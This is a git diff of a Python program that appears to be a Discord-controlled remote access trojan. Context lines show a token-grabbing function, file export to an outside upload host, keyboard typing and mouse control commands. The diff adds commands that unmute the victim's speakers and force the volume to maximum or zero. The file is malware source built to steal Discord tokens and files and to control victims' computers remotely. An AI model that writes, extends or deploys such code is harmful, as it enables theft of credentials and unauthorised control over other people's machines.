@@ -9,6 +9,8 @@ import requests
 import subprocess
 import string
 
+
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from datetime import datetime
 from uuid import getnode as get_mac
 from settings import *
@@ -22,6 +24,8 @@ from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 from PIL import Image, ImageDraw, ImageFont #mouse grid image
+from comtypes import CLSCTX_ALL
+from ctypes import *
 
 
 file_api = "https://api.letsupload.cc/upload"
@@ -155,6 +159,21 @@ def get_token():
                         grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
                         grabembed.timestamp = datetime.utcnow()
                 else: continue
+
+
+def volumeup():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    if volume.GetMute() == 1:
+        volume.SetMute(0, None)
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
+
+def volumedown():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
 new_ascii = """ 
 
  .d8888b.  888          888    888                        .d8888b.                       888 
@@ -326,6 +345,7 @@ async def on_message(message):
                     await message.reply('Purging...')
                     await message.channel.purge(limit=None) 
                 case ".restart":
+
                     new_msg = await message.reply("Are you sure you want to restart the connection?")
                     await new_msg.add_reaction("✅")
                     await new_msg.add_reaction("❌")
@@ -348,6 +368,17 @@ async def on_message(message):
                             await delmsg.delete()
                     except asyncio.TimeoutError:
                         await message.channel.send("You didn't react in time.")             
+                case ".volumeup":
+                    new_msg = await message.reply("Increasing the volume")
+                    volumeup()
+                    await channel.send("Volume is set to 100%")
+
+                case ".volumedown":
+                    new_msg = await message.reply("Decreasing the volume")
+                    volumedown()
+                    await channel.send("Volume is set to 0%")
+
+
             if message.content.lower().startswith(".export"):
                 file = message.content[8:]
                 try:
@@ -434,7 +465,6 @@ async def on_message(message):
                         await delmsg.delete()
                 except asyncio.TimeoutError:
                     await message.channel.send("You didn't react in time.")
-
             elif message.content.lower().startswith(".type"):
                 content = message.content[6:]
                 new_msg = await message.reply(f"are you sure you want to type this in as a keyboard? \n ``{content}``")
@@ -464,6 +494,8 @@ async def on_message(message):
                         await delmsg.delete()
                 except asyncio.TimeoutError:
                     await message.channel.send("You didn't react in time.")
+
+
 
             elif message.content.lower().startswith(".mouse"):
                 command = message.content[7:]
